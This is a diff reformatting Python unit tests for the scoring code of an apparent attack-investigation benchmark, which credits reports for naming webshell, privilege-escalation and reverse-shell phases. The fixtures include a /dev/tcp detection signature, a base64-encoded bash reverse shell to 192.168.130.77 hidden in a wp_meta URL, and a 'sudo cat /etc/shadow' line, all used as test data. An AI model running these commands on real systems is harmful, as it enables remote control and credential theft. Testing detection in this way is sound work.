@@ -3,6 +3,7 @@
 Pure functions of a ScoringContext — no Django, no live services — so they run in
 the normal offline suite.
 """
+
 from __future__ import annotations
 
 import os
@@ -11,7 +12,9 @@ import tempfile
 import unittest
 from pathlib import Path
 
-_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))
+_ROOT = os.path.dirname(
+    os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
+)
 sys.path.insert(0, _ROOT)
 
 from benchmark import scoring  # noqa: E402
@@ -22,15 +25,27 @@ from benchmark.pipeline.score import metric_rows  # noqa: E402
 
 # A minimal two-phase scenario built inline, independent of fox.yaml, so the logic
 # is tested in isolation from the (evolving) real spec.
-_SCENARIO = ScenarioSpec.from_dict({
-    "name": "toy",
-    "phases": [
-        {"name": "webshell", "start": "2022-01-18T12:38:00Z", "end": "2022-01-18T12:38:30Z",
-         "agent_id": "27", "content_signature": {"all": ["webshell"]}},
-        {"name": "privilege_escalation", "start": "2022-01-18T13:14:30Z", "end": "2022-01-18T13:14:53Z",
-         "agent_id": "27", "content_signature": {"all": ["phopkins"]}},
-    ],
-})
+_SCENARIO = ScenarioSpec.from_dict(
+    {
+        "name": "toy",
+        "phases": [
+            {
+                "name": "webshell",
+                "start": "2022-01-18T12:38:00Z",
+                "end": "2022-01-18T12:38:30Z",
+                "agent_id": "27",
+                "content_signature": {"all": ["webshell"]},
+            },
+            {
+                "name": "privilege_escalation",
+                "start": "2022-01-18T13:14:30Z",
+                "end": "2022-01-18T13:14:53Z",
+                "agent_id": "27",
+                "content_signature": {"all": ["phopkins"]},
+            },
+        ],
+    }
+)
 
 
 def _phase_result(report_text: str):
@@ -44,8 +59,8 @@ class PhaseRecallTest(unittest.TestCase):
         report = "## Confirmed Timeline\n- `2022-01-18T12:38:29Z` — webshell hit (`w2X30PYVatKFcWqVUjiG`)."
         r = _phase_result(report)
         self.assertEqual(r.kind, "per_key")
-        self.assertTrue(r.value["webshell"])                 # ts inside webshell window
-        self.assertFalse(r.value["privilege_escalation"])    # nothing in privesc window
+        self.assertTrue(r.value["webshell"])  # ts inside webshell window
+        self.assertFalse(r.value["privilege_escalation"])  # nothing in privesc window
         self.assertEqual(r.detail["reached"], 1)
         self.assertEqual(r.detail["missed"], ["privilege_escalation"])
 
@@ -83,10 +98,20 @@ class PhaseRecallTest(unittest.TestCase):
             self.assertEqual(_phase_result(line).detail["reached"], 0, line)
 
     def test_compact_range_suffix_does_not_credit_phase(self):
-        scen = ScenarioSpec.from_dict({"name": "toy_range", "phases": [
-            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
-             "agent_id": "27", "content_signature": {"all": ["wp_meta"]}},
-        ]})
+        scen = ScenarioSpec.from_dict(
+            {
+                "name": "toy_range",
+                "phases": [
+                    {
+                        "name": "reverse_shell",
+                        "start": "2022-01-18T13:13:50Z",
+                        "end": "2022-01-18T13:14:30Z",
+                        "agent_id": "27",
+                        "content_signature": {"all": ["wp_meta"]},
+                    },
+                ],
+            }
+        )
         ctx = ScoringContext.build(
             scen,
             "Success criteria: searched `2022-01-18T13:10:00Z/13:20:00Z` and saw decoded wp_meta.",
@@ -102,10 +127,14 @@ class PhaseRecallTest(unittest.TestCase):
     def test_event_time_resolution_is_ignored_for_phase_credit(self):
         # Passing event_times is still tolerated for compatibility, but it no longer
         # contributes phase coverage.
-        report = "- command: [decoded] [\"bash\",\"-c\",\"…51898…\"] [qDqTUjp7_4q5yqmXwtAG]"
+        report = '- command: [decoded] ["bash","-c","…51898…"] [qDqTUjp7_4q5yqmXwtAG]'
         ctx = ScoringContext.build(
-            _SCENARIO, report, entry_point="recon",
-            event_times={"qDqTUjp7_4q5yqmXwtAG": "2022-01-18T12:38:15Z"},  # inside webshell window
+            _SCENARIO,
+            report,
+            entry_point="recon",
+            event_times={
+                "qDqTUjp7_4q5yqmXwtAG": "2022-01-18T12:38:15Z"
+            },  # inside webshell window
         )
         (r,) = scoring.run_all(ctx, ["phase_recall"])
         self.assertFalse(r.value["webshell"])
@@ -117,23 +146,49 @@ class PhaseRecallTest(unittest.TestCase):
 
     def test_unscorable_phase_excluded_from_denominator(self):
         # A phase with no distinguishing event (scorable: false) is dropped from recall.
-        scen = ScenarioSpec.from_dict({"name": "toy2", "phases": [
-            {"name": "webshell", "start": "2022-01-18T12:38:00Z", "end": "2022-01-18T12:38:30Z",
-             "agent_id": "27"},
-            {"name": "dnsteal", "start": "2022-01-17T09:04:48Z", "end": "2022-01-17T10:00:00Z",
-             "agent_id": "18", "scorable": False},
-        ]})
-        ctx = ScoringContext.build(scen, "- `2022-01-18T12:38:20Z` — `w2X30PYVatKFcWqVUjiG`.")
+        scen = ScenarioSpec.from_dict(
+            {
+                "name": "toy2",
+                "phases": [
+                    {
+                        "name": "webshell",
+                        "start": "2022-01-18T12:38:00Z",
+                        "end": "2022-01-18T12:38:30Z",
+                        "agent_id": "27",
+                    },
+                    {
+                        "name": "dnsteal",
+                        "start": "2022-01-17T09:04:48Z",
+                        "end": "2022-01-17T10:00:00Z",
+                        "agent_id": "18",
+                        "scorable": False,
+                    },
+                ],
+            }
+        )
+        ctx = ScoringContext.build(
+            scen, "- `2022-01-18T12:38:20Z` — `w2X30PYVatKFcWqVUjiG`."
+        )
         (r,) = scoring.run_all(ctx, ["phase_recall"])
-        self.assertEqual(r.detail["total"], 1)          # only webshell counts
+        self.assertEqual(r.detail["total"], 1)  # only webshell counts
         self.assertNotIn("dnsteal", r.value)
         self.assertEqual(r.detail["recall"], 1.0)
 
     def test_content_signature_gates_printed_timestamp_credit(self):
-        scen = ScenarioSpec.from_dict({"name": "toy3", "phases": [
-            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
-             "agent_id": "27", "content_signature": {"all": ["wp_meta"]}},
-        ]})
+        scen = ScenarioSpec.from_dict(
+            {
+                "name": "toy3",
+                "phases": [
+                    {
+                        "name": "reverse_shell",
+                        "start": "2022-01-18T13:13:50Z",
+                        "end": "2022-01-18T13:14:30Z",
+                        "agent_id": "27",
+                        "content_signature": {"all": ["wp_meta"]},
+                    },
+                ],
+            }
+        )
         ctx = ScoringContext.build(
             scen,
             "- `2022-01-18T13:14:18Z` — request for /wp-content/uploads/a.php?wp_meta=abc.",
@@ -149,10 +204,20 @@ class PhaseRecallTest(unittest.TestCase):
         self.assertFalse(r.value["reverse_shell"])
 
     def test_timestamp_without_signature_does_not_credit(self):
-        scen = ScenarioSpec.from_dict({"name": "toy4", "phases": [
-            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
-             "agent_id": "27", "content_signature": {"all": ["wp_meta"]}},
-        ]})
+        scen = ScenarioSpec.from_dict(
+            {
+                "name": "toy4",
+                "phases": [
+                    {
+                        "name": "reverse_shell",
+                        "start": "2022-01-18T13:13:50Z",
+                        "end": "2022-01-18T13:14:30Z",
+                        "agent_id": "27",
+                        "content_signature": {"all": ["wp_meta"]},
+                    },
+                ],
+            }
+        )
         ctx = ScoringContext.build(
             scen,
             "- `2022-01-18T13:14:18Z` — same-host benign HTTP `GET /`.",
@@ -161,10 +226,20 @@ class PhaseRecallTest(unittest.TestCase):
         self.assertFalse(r.value["reverse_shell"])
 
     def test_surface_line_can_bridge_to_matching_raw_event(self):
-        scen = ScenarioSpec.from_dict({"name": "toy5", "phases": [
-            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
-             "agent_id": "27", "content_signature": {"all": ["wp_meta"]}},
-        ]})
+        scen = ScenarioSpec.from_dict(
+            {
+                "name": "toy5",
+                "phases": [
+                    {
+                        "name": "reverse_shell",
+                        "start": "2022-01-18T13:13:50Z",
+                        "end": "2022-01-18T13:14:30Z",
+                        "agent_id": "27",
+                        "content_signature": {"all": ["wp_meta"]},
+                    },
+                ],
+            }
+        )
         ctx = ScoringContext.build(
             scen,
             "- `_id=qDqTUjp7_4q5yqmXwtAG` shows decoded `wp_meta` with reverse-shell content.",
@@ -180,10 +255,22 @@ class PhaseRecallTest(unittest.TestCase):
         self.assertTrue(r.value["reverse_shell"])
 
     def test_raw_event_match_counts_even_if_report_line_is_inventory_style(self):
-        scen = ScenarioSpec.from_dict({"name": "toy6", "phases": [
-            {"name": "service_stop", "start": "2022-01-17T09:04:46Z", "end": "2022-01-17T09:04:48Z",
-             "agent_id": "1", "content_signature": {"all": ["service_stop", "unit=consequuntur"]}},
-        ]})
+        scen = ScenarioSpec.from_dict(
+            {
+                "name": "toy6",
+                "phases": [
+                    {
+                        "name": "service_stop",
+                        "start": "2022-01-17T09:04:46Z",
+                        "end": "2022-01-17T09:04:48Z",
+                        "agent_id": "1",
+                        "content_signature": {
+                            "all": ["service_stop", "unit=consequuntur"]
+                        },
+                    },
+                ],
+            }
+        )
         ctx = ScoringContext.build(
             scen,
             "- ip: 10.35.33.111 [W97tlNbPiHN2dM3J4ymz]",
@@ -201,10 +288,22 @@ class PhaseRecallTest(unittest.TestCase):
     def test_bridge_decodes_wp_meta_payload_terms(self):
         # Regression: exploit payload terms can live only in URL-encoded/base64
         # wp_meta. Raw matching must decode before applying content signatures.
-        scen = ScenarioSpec.from_dict({"name": "toy_wpmeta", "phases": [
-            {"name": "reverse_shell", "start": "2022-01-18T13:13:50Z", "end": "2022-01-18T13:14:30Z",
-             "agent_id": "27", "content_signature": {"all": ["wp_meta", "/dev/tcp/192.168.130.77/51898"]}},
-        ]})
+        scen = ScenarioSpec.from_dict(
+            {
+                "name": "toy_wpmeta",
+                "phases": [
+                    {
+                        "name": "reverse_shell",
+                        "start": "2022-01-18T13:13:50Z",
+                        "end": "2022-01-18T13:14:30Z",
+                        "agent_id": "27",
+                        "content_signature": {
+                            "all": ["wp_meta", "/dev/tcp/192.168.130.77/51898"]
+                        },
+                    },
+                ],
+            }
+        )
         ctx = ScoringContext.build(
             scen,
             "- surfaced event `qDqTUjp7_4q5yqmXwtAG` indicates post-exploitation webshell activity.",
@@ -215,7 +314,7 @@ class PhaseRecallTest(unittest.TestCase):
                     (
                         '{"@timestamp":"2022-01-18T13:14:18Z",'
                         '"data":{"url":"/wp-content/uploads/2022/01/yqagisjaqe.php?wp_meta='
-                        'WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsg'
+                        "WyJiYXNoIiwgIi1jIiwgIiAnMDwmMTk2O2V4ZWMgMTk2PD4vZGV2L3RjcC8xOTIuMTY4LjEzMC43Ny81MTg5ODsg"
                         'c2ggPCYxOTYgPiYxOTYgMj4mMTk2JyIsICImIl0%3D"}}'
                     ),
                 )
@@ -225,10 +324,20 @@ class PhaseRecallTest(unittest.TestCase):
         self.assertTrue(r.value["reverse_shell"])
 
     def test_legacy_any_bucket_is_conjunctive(self):
-        scen = ScenarioSpec.from_dict({"name": "toy7", "phases": [
-            {"name": "webshell", "start": "2022-01-18T12:38:00Z", "end": "2022-01-18T12:38:30Z",
-             "agent_id": "27", "content_signature": {"any": ["wp_meta", "wordpress_db"]}},
-        ]})
+        scen = ScenarioSpec.from_dict(
+            {
+                "name": "toy7",
+                "phases": [
+                    {
+                        "name": "webshell",
+                        "start": "2022-01-18T12:38:00Z",
+                        "end": "2022-01-18T12:38:30Z",
+                        "agent_id": "27",
+                        "content_signature": {"any": ["wp_meta", "wordpress_db"]},
+                    },
+                ],
+            }
+        )
         ctx = ScoringContext.build(
             scen,
             "- `2022-01-18T12:38:20Z` — wp_meta request only.",
@@ -248,7 +357,9 @@ class AnchorEchoTest(unittest.TestCase):
 
     def _score(self, report_text: str):
         ctx = ScoringContext.build(
-            _SCENARIO, report_text, entry_point="privilege_escalation",
+            _SCENARIO,
+            report_text,
+            entry_point="privilege_escalation",
             meta={"anchor_timestamp": self.ANCHOR},
         )
         (result,) = scoring.run_all(ctx, ["phase_recall"])
@@ -256,8 +367,10 @@ class AnchorEchoTest(unittest.TestCase):
 
     def test_bare_anchor_echo_does_not_credit_phase(self):
         # The echoed question line: anchor timestamp, no event id → hollow, not reached.
-        report = ("**Question:** Triage and investigate alert ~1. The alert corresponds "
-                  "to activity observed around 2022-01-18T13:14:31Z.")
+        report = (
+            "**Question:** Triage and investigate alert ~1. The alert corresponds "
+            "to activity observed around 2022-01-18T13:14:31Z."
+        )
         self.assertFalse(self._score(report).value["privilege_escalation"])
 
     def test_anchor_cited_with_event_id_still_credits_phase(self):
@@ -267,15 +380,19 @@ class AnchorEchoTest(unittest.TestCase):
 
     def test_distinct_in_window_event_still_credits_despite_echo(self):
         # Echoed anchor (no id) PLUS a distinct in-window event (with id) → reached via the real one.
-        report = ("**Question:** …activity observed around 2022-01-18T13:14:31Z.\n"
-                  "- `2022-01-18T13:14:49Z` — `3kp8gZqt29xgUPf7VD3i`: phopkins sudo cat /etc/shadow.")
+        report = (
+            "**Question:** …activity observed around 2022-01-18T13:14:31Z.\n"
+            "- `2022-01-18T13:14:49Z` — `3kp8gZqt29xgUPf7VD3i`: phopkins sudo cat /etc/shadow."
+        )
         self.assertTrue(self._score(report).value["privilege_escalation"])
 
     def test_no_anchor_meta_preserves_legacy_behavior(self):
         # Without an injected anchor, a bare in-window timestamp still counts if it carries
         # phase-identifying content.
         report = "- 2022-01-18T13:14:31Z — phopkins activity noted."
-        ctx = ScoringContext.build(_SCENARIO, report, entry_point="privilege_escalation")
+        ctx = ScoringContext.build(
+            _SCENARIO, report, entry_point="privilege_escalation"
+        )
         (result,) = scoring.run_all(ctx, ["phase_recall"])
         self.assertTrue(result.value["privilege_escalation"])
 
@@ -287,24 +404,36 @@ class InvalidTrialExclusionTest(unittest.TestCase):
 
     def _card(self, *, trial, valid, webshell_hit):
         r = _phase_result(
-            "Confirmed webshell via `2022-01-18T12:38:29Z` (`w2X30PYVatKFcWqVUjiG`)." if webshell_hit else "nothing."
+            "Confirmed webshell via `2022-01-18T12:38:29Z` (`w2X30PYVatKFcWqVUjiG`)."
+            if webshell_hit
+            else "nothing."
         )
         return {
-            "scenario": "toy", "entry_point": "recon", "trial": trial,
-            "status": "completed" if valid else "failed", "trial_valid": valid,
-            "results": [{"name": r.name, "kind": r.kind, "value": r.value, "detail": r.detail}],
+            "scenario": "toy",
+            "entry_point": "recon",
+            "trial": trial,
+            "status": "completed" if valid else "failed",
+            "trial_valid": valid,
+            "results": [
+                {"name": r.name, "kind": r.kind, "value": r.value, "detail": r.detail}
+            ],
         }
 
     def test_invalid_trial_excluded_from_rollup(self):
         from benchmark.pipeline.report import aggregate_cards
+
         cards = [
-            self._card(trial=1, valid=True, webshell_hit=True),   # real hit
-            self._card(trial=2, valid=False, webshell_hit=False),  # infra failure → must not count
+            self._card(trial=1, valid=True, webshell_hit=True),  # real hit
+            self._card(
+                trial=2, valid=False, webshell_hit=False
+            ),  # infra failure → must not count
         ]
         agg = aggregate_cards(cards)["toy"]["recon"]
-        self.assertEqual(agg["trials"], 1)            # only the valid trial
+        self.assertEqual(agg["trials"], 1)  # only the valid trial
         self.assertEqual(agg["excluded_trials"], 1)
-        self.assertEqual(agg["metrics"]["phase_recall"]["per_key"]["webshell"], 1.0)  # not diluted to 0.5
+        self.assertEqual(
+            agg["metrics"]["phase_recall"]["per_key"]["webshell"], 1.0
+        )  # not diluted to 0.5
 
 
 class FoxSpecTest(unittest.TestCase):
@@ -320,10 +449,16 @@ class FoxSpecTest(unittest.TestCase):
         self.assertFalse(by_name["dnsteal"].scorable)
         self.assertTrue(by_name["reverse_shell"].scorable)
         # corrected detecting rules (were mis-identified in the prior spec)
-        self.assertEqual(by_name["cracking"].marker_rules, {"31108"})          # was 86601 (a scan rule)
-        self.assertEqual(by_name["privilege_escalation"].marker_rules, {"5304", "5402"})  # was 5501
+        self.assertEqual(
+            by_name["cracking"].marker_rules, {"31108"}
+        )  # was 86601 (a scan rule)
+        self.assertEqual(
+            by_name["privilege_escalation"].marker_rules, {"5304", "5402"}
+        )  # was 5501
         # every phase parsed a valid window
-        self.assertTrue(all(p.start and p.end and p.end >= p.start for p in spec.phases))
+        self.assertTrue(
+            all(p.start and p.end and p.end >= p.start for p in spec.phases)
+        )
         # entry points tagged organic vs synthetic
         kinds = {e.id: e.kind for e in spec.entry_points}
         self.assertEqual(kinds["recon"], "organic")
@@ -363,7 +498,9 @@ class PandasFriendlyOutputTest(unittest.TestCase):
         self.assertFalse(by_key["privilege_escalation"]["value"])
         self.assertEqual(by_key["webshell"]["metric"], "phase_recall")
         self.assertEqual(by_key["webshell"]["detail_recall"], 0.5)
-        self.assertEqual(by_key["webshell"]["detail_missed"], '["privilege_escalation"]')
+        self.assertEqual(
+            by_key["webshell"]["detail_missed"], '["privilege_escalation"]'
+        )
 
     def test_report_writes_scenario_csv(self):
         cards = [
@@ -377,7 +514,12 @@ class PandasFriendlyOutputTest(unittest.TestCase):
                         "name": "phase_recall",
                         "kind": "per_key",
                         "value": {"webshell": True, "privilege_escalation": False},
-                        "detail": {"reached": 1, "total": 2, "recall": 0.5, "missed": ["privilege_escalation"]},
+                        "detail": {
+                            "reached": 1,
+                            "total": 2,
+                            "recall": 0.5,
+                            "missed": ["privilege_escalation"],
+                        },
                     }
                 ],
             }
